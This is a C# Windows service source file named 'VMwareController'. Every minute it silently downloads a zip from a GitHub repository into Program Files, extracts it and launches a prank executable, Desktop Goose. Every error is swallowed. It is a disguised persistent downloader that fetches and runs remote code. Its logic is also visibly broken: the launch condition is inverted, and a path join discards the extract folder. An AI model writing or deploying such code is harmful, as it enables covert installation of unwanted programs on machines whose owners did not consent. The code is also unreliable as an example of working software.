using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
using System.Net;
using System.IO;
using System.IO.Compression;


namespace VMwareController
{
    public partial class Service1 : ServiceBase
    {
        private Timer timer;

        public Service1()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            timer = new Timer(60000);
            timer.Elapsed += DoCoolThing;
            timer.Start();

        }

        protected override void OnStop()
        {
            timer.Stop();
        }

        private void DoCoolThing(object sender, ElapsedEventArgs e)
        {
            try
            {
                string url = "https://github.com/burner-afk/grouse/archive/refs/heads/main.zip";
                string localZipPath = "C:\\Program Files\\grouse-main.zip";
                string extractPath = "C:\\Program Files\\grouse-main";
                string exePath = Path.Combine(extractPath, "\\grouse-main\\DesktopGoose v0.31\\GooseDesktop.exe");

                

                if (!File.Exists(exePath))
                {
                    if (Directory.Exists(extractPath))
                    {
                        Directory.Delete(extractPath, true);
                    }

                    Directory.CreateDirectory(Path.GetDirectoryName(localZipPath));
                    Directory.CreateDirectory(extractPath);

                    using (WebClient client = new WebClient())
                    {
                        client.DownloadFile(url, localZipPath);
                    }
                    ZipFile.ExtractToDirectory(localZipPath, extractPath);
                    File.Delete(localZipPath);

                }

                

                

                if (!File.Exists(exePath))
                {
                    ProcessStartInfo psi = new ProcessStartInfo
                    {
                        FileName = exePath


                    };
                    Process.Start(psi);
                }


            }
            catch
            {

            }
            
        }
    }
}
